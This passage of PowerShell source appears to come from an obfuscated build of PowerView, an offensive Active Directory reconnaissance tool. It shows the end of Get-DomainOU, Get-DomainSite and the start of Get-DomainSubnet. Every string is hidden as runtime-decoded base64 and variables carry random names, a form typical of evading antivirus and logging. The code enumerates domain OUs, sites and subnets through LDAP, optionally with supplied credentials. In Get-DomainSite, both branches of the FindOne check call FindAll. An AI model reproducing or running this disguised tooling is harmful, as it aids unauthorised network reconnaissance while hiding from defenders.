BkAG8AbQBhAGkAbgAgACcAJAB7ADgANAA0ADIAMwBjAGIAZgA1AGEANQA0ADQAZgBkAD
YAYQBhADAANQBkAGMANwAyADAAMQBmADgANAAyADUANgB9ACcAIABmAHIAbwBtACAAJw
AkAHsAMABjADIAYgA2AGUAYwAxAGQAOAA0AGUANABjADkAMQA4ADgAZAA0AGQANwAzAG
MANgAwADcANAAyADYAZAAzAH0AJwA=')))
                        
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = ${84423cbf5a544fd6aa05dc7201f84256}
        
                ${0b59591f1dac46899e2644150bfd6276} = Get-
DomainSearcher @ea43c787582f45539b7f519da4680c7a
                     
   if (-not ${0b59591f1dac46899e2644150bfd6276}) {
                   
         Write-Warning $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAAVQBuAGEAYgBsAGUAIAB0AG8AIA
ByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAHIAYwBoAGUAcgAgAG
YAbwByACAAJwAkAHsAOAA0ADQAMgAzAGMAYgBmADUAYQA1ADQANABmAGQANgBhAGEAMA
A1AGQAYwA3ADIAMAAxAGYAOAA0ADIANQA2AH0AJwA=')))
                       
 }
                    }
                }
                else {
       
             try {
                        
${3e0cccb945b440b99b2100f08845f4a8} = (-Join 
(([Guid]${0c2b6ec1d84e4c9188d4d73c607426d3}).ToByteArray() | 
ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XAAkADEA')))
                        
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADMAZQAwAGMAYwBjAGIAOQA0ADUAYg
A0ADQAMABiADkAOQBiADIAMQAwADAAZgAwADgAOAA0ADUAZgA0AGEAOAB9ACkA')))
   
                 }
                    catch {
                        
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABuAGEAbQBlAD0AJAB7ADAAYwAyAGIANgBlAGMAMQBkADgANABlADQAYwA5ADEAOA
A4AGQANABkADcAMwBjADYAMAA3ADQAMgA2AGQAMwB9ACkA')))
                   
 }
                }
            }
            if 
(${987d1cda8c15450d8512978866836ba0} -and 
(${987d1cda8c15450d8512978866836ba0}.Trim() -ne '') ) {
              
  $Filter += $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB8ACQAewA5ADgANwBkADEAYwBkAGEAOABjADEANQA0ADUAMABkADgANQAxADIAOQ
A3ADgAOAA2ADYAOAAzADYAYgBhADAAfQApAA==')))
            }
            
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RwBQAEwAaQBuAGsA')))]) {
               
 Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIA
BmAG8AcgAgAE8AVQBzACAAdwBpAHQAaAAgACQARwBQAEwAaQBuAGsAIABzAGUAdAAgAG
kAbgAgAHQAaABlACAAZwBwAEwAaQBuAGsAIABwAHIAbwBwAGUAcgB0AHkA')))
       
         $Filter += $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABnAHAAbABpAG4AawA9ACoAJABHAFAATABpAG4AawAqACkA')))
            }
  
          if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAAVQBzAGkAbgBnACAAYQBkAGQAaQ
B0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6ACAAJABMAEQAQQBQAE
YAaQBsAHQAZQByAA==')))
                $Filter += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            
${0b59591f1dac46899e2644150bfd6276}.filter = 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AbwByAGcAYQBuAGkAeg
BhAHQAaQBvAG4AYQBsAFUAbgBpAHQAKQAkAEYAaQBsAHQAZQByACkA')))
           
 Write-Verbose "[Get-DomainOU] Get-DomainOU filter string: 
$(${0b59591f1dac46899e2644150bfd6276}.filter)"
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { 
${9f78951ba80c437e9db41515f07bc24e} = 
${0b59591f1dac46899e2644150bfd6276}.FindOne() }
            else { 
${9f78951ba80c437e9db41515f07bc24e} = 
${0b59591f1dac46899e2644150bfd6276}.FindAll() }
            
${9f78951ba80c437e9db41515f07bc24e} | Where-Object {$_} | ForEach-
Object {
                if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBhAHcA')))]) {
                    
${f831cf2819964b2f8d564d7cbd442168} = $_
                }
            
    else {
                    ${f831cf2819964b2f8d564d7cbd442168} = 
Convert-LDAPProperty -Properties $_.Properties
                }
      
          
${f831cf2819964b2f8d564d7cbd442168}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBPAFUA'))))
                
${f831cf2819964b2f8d564d7cbd442168}
            }
            if 
(${9f78951ba80c437e9db41515f07bc24e}) {
                try { 
${9f78951ba80c437e9db41515f07bc24e}.dispose() }
                catch 
{
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AVQBdACAARQByAHIAbwByACAAZABpAHMAcA
BvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAG
MAdAA6ACAAJABfAA==')))
                }
            }
            
${0b59591f1dac46899e2644150bfd6276}.dispose()
        }
    }
}
function 
Get-DomainSite {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    
[CmdletBinding()]
    Param (
        [Parameter(Position = 0, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('Name')]
        [String[]]
        $Identity,
   
     [ValidateNotNullOrEmpty()]
        [String]
        [Alias
('GUID')]
        $GPLink,
        [ValidateNotNullOrEmpty()]
        
[String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        
[Alias('Filter')]
        [String]
        $LDAPFilter,
        
[ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
     
   [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        
[String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
       
 [Alias('DomainController')]
        [String]
        $Server,
        
[ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        
$SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet
('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        
$SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias
('ReturnOne')]
        [Switch]
        $FindOne,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [Switch]
        
$Raw
    )
    BEGIN {
        ${ea43c787582f45539b7f519da4680c7a} = @
{
            'SearchBasePrefix' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBOAD0AUwBpAHQAZQBzACwAQwBOAD0AQwBvAG4AZgBpAGcAdQByAGEAdABpAG8Abg
A=')))
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
       
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${bc9ec12c944a4dcb971acbbea50d9824} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
    }
    PROCESS {
        if 
(${bc9ec12c944a4dcb971acbbea50d9824}) {
            
${987d1cda8c15450d8512978866836ba0} = ''
            $Filter = ''
     
       $Identity | Where-Object {$_} | ForEach-Object {
              
  ${0c2b6ec1d84e4c9188d4d73c607426d3} = $_.Replace('(', 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XAAyADkA'))))
                if 
(${0c2b6ec1d84e4c9188d4d73c607426d3} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBDAE4APQAuACoA')))) {
                    
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMABjADIAYg
A2AGUAYwAxAGQAOAA0AGUANABjADkAMQA4ADgAZAA0AGQANwAzAGMANgAwADcANAAyAD
YAZAAzAH0AKQA=')))
                    if ((-not $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        
${84423cbf5a544fd6aa05dc7201f84256} = 
${0c2b6ec1d84e4c9188d4d73c607426d3}.SubString
(${0c2b6ec1d84e4c9188d4d73c607426d3}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
                 Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAEUAeAB0AHIAYQBjAHQAZQ
BkACAAZABvAG0AYQBpAG4AIAAnACQAewA4ADQANAAyADMAYwBiAGYANQBhADUANAA0AG
YAZAA2AGEAYQAwADUAZABjADcAMgAwADEAZgA4ADQAMgA1ADYAfQAnACAAZgByAG8AbQ
AgACcAJAB7ADAAYwAyAGIANgBlAGMAMQBkADgANABlADQAYwA5ADEAOAA4AGQANABkAD
cAMwBjADYAMAA3ADQAMgA2AGQAMwB9ACcA')))
                        
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = ${84423cbf5a544fd6aa05dc7201f84256}
        
                ${bc9ec12c944a4dcb971acbbea50d9824} = Get-
DomainSearcher @ea43c787582f45539b7f519da4680c7a
                     
   if (-not ${bc9ec12c944a4dcb971acbbea50d9824}) {
                   
         Write-Warning $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAFUAbgBhAGIAbABlACAAdA
BvACAAcgBlAHQAcgBpAGUAdgBlACAAZABvAG0AYQBpAG4AIABzAGUAYQByAGMAaABlAH
IAIABmAG8AcgAgACcAJAB7ADgANAA0ADIAMwBjAGIAZgA1AGEANQA0ADQAZgBkADYAYQ
BhADAANQBkAGMANwAyADAAMQBmADgANAAyADUANgB9ACcA')))
                   
     }
                    }
                }
                else {
   
                 try {
                        
${3e0cccb945b440b99b2100f08845f4a8} = (-Join 
(([Guid]${0c2b6ec1d84e4c9188d4d73c607426d3}).ToByteArray() | 
ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XAAkADEA')))
                        
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADMAZQAwAGMAYwBjAGIAOQA0ADUAYg
A0ADQAMABiADkAOQBiADIAMQAwADAAZgAwADgAOAA0ADUAZgA0AGEAOAB9ACkA')))
   
                 }
                    catch {
                        
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABuAGEAbQBlAD0AJAB7ADAAYwAyAGIANgBlAGMAMQBkADgANABlADQAYwA5ADEAOA
A4AGQANABkADcAMwBjADYAMAA3ADQAMgA2AGQAMwB9ACkA')))
                   
 }
                }
            }
            if 
(${987d1cda8c15450d8512978866836ba0} -and 
(${987d1cda8c15450d8512978866836ba0}.Trim() -ne '') ) {
              
  $Filter += $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB8ACQAewA5ADgANwBkADEAYwBkAGEAOABjADEANQA0ADUAMABkADgANQAxADIAOQ
A3ADgAOAA2ADYAOAAzADYAYgBhADAAfQApAA==')))
            }
            
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RwBQAEwAaQBuAGsA')))]) {
               
 Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAFMAZQBhAHIAYwBoAGkAbg
BnACAAZgBvAHIAIABzAGkAdABlAHMAIAB3AGkAdABoACAAJABHAFAATABpAG4AawAgAH
MAZQB0ACAAaQBuACAAdABoAGUAIABnAHAATABpAG4AawAgAHAAcgBvAHAAZQByAHQAeQ
A=')))
                $Filter += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABnAHAAbABpAG4AawA9ACoAJABHAFAATABpAG4AawAqACkA')))
            }
  
          if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAFUAcwBpAG4AZwAgAGEAZA
BkAGkAdABpAG8AbgBhAGwAIABMAEQAQQBQACAAZgBpAGwAdABlAHIAOgAgACQATABEAE
EAUABGAGkAbAB0AGUAcgA=')))
                $Filter += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            
${bc9ec12c944a4dcb971acbbea50d9824}.filter = 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcwBpAHQAZQApACQARg
BpAGwAdABlAHIAKQA=')))
            Write-Verbose "[Get-DomainSite] 
Get-DomainSite filter string: 
$(${bc9ec12c944a4dcb971acbbea50d9824}.filter)"
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { 
${9f78951ba80c437e9db41515f07bc24e} = 
${bc9ec12c944a4dcb971acbbea50d9824}.FindAll() }
            else { 
${9f78951ba80c437e9db41515f07bc24e} = 
${bc9ec12c944a4dcb971acbbea50d9824}.FindAll() }
            
${9f78951ba80c437e9db41515f07bc24e} | Where-Object {$_} | ForEach-
Object {
                if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBhAHcA')))]) {
                    
${9a8cc1e63a154bc1956af480f69d7624} = $_
                }
            
    else {
                    ${9a8cc1e63a154bc1956af480f69d7624} = 
Convert-LDAPProperty -Properties $_.Properties
                }
      
          
${9a8cc1e63a154bc1956af480f69d7624}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBTAGkAdABlAA=='))))
                
${9a8cc1e63a154bc1956af480f69d7624}
            }
            if 
(${9f78951ba80c437e9db41515f07bc24e}) {
                try { 
${9f78951ba80c437e9db41515f07bc24e}.dispose() }
                catch 
{
                    Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAEUAcgByAG8AcgAgAGQAaQ
BzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAG
oAZQBjAHQA')))
                }
            }
            
${bc9ec12c944a4dcb971acbbea50d9824}.dispose()
        }
    }
}
function 
Get-DomainSubnet {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    
[CmdletBinding()]
    Param (
        [Parameter(Position = 0, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('Name')]
        [String[]]
        $Identity,
   
     [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,
    
    [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
       
 [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        
[String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
       
 [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
    
    [Alias('ADSPath')]
        [String]
        $SearchBase,
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 
'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        
[ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 
'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        
[Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        
[Switch]
        $FindOne,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [Switch]
        
$Raw
    )
    BEGIN {
        ${ea43c787582f45539b7f519da4680c7a} = @
{
            'SearchBasePrefix' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBOAD0AUwB1AGIAbgBlAHQAcwAsAEMATgA9AFMAaQB0AGUAcwAsAEMATgA9AEMAbw
BuAGYAaQBnAHUAcgBhAHQAaQBvAG4A')))
        }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
       
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${7b9f94c1270546ad8d065aec6410bbf7} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
    }
    PROCESS {
        if 
(${7b9f94c1270546ad8d065aec6410bbf7}) {
            
${987d1cda8c15450d8512978866836ba0} = ''
            $Filter = ''
     
       $Identity | Where-Object {$_} | ForEach-Object {
              
  ${0c2b6ec1d84e4c9188d4d73c607426d3} = $_.Replace('(', 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XAAyADkA'))))
                if 
(${0c2b6ec1d84e4c9188d4d73c607426d3} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBDAE4APQAuACoA')))) {
                    
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMABjADIAYg
A2AGUAYwAxAGQAOAA0AGUANABjADkAMQA4ADgAZAA0AGQANwAzAGMANgAwADcANAAyAD
YAZAAzAH0AKQA=')))
                    if ((-not $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        
${84423cbf5a544fd6aa05dc7201f84256} = 
${0c2b6ec1d84e4c9188d4d73c607426d3}.SubString
(${0c2b6ec1d84e4c9188d4d73c607426d3}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
                 Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABFAHgAdAByAGEAYw
B0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsAOAA0ADQAMgAzAGMAYgBmADUAYQA1AD
QANABmAGQANgBhAGEAMAA1AGQAYwA3ADIAMAAxAGYAOAA0ADIANQA2AH0AJwAgAGYAcg
BvAG0AIAAnACQAewAwAGMAMgBiADYAZQBjADEAZAA4ADQAZQA0AGMAOQAxADgAOABkAD
QAZAA3ADMAYwA2ADAANwA0ADIANgBkADMAfQAnAA==')))
                       
 ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = ${84423cbf5a544fd6aa05dc7201f84256}
        
                ${7b9f94c1270546ad8d065aec6410bbf7} = Get-
DomainSearcher @ea43c787582f45539b7f519da4680c7a
                     
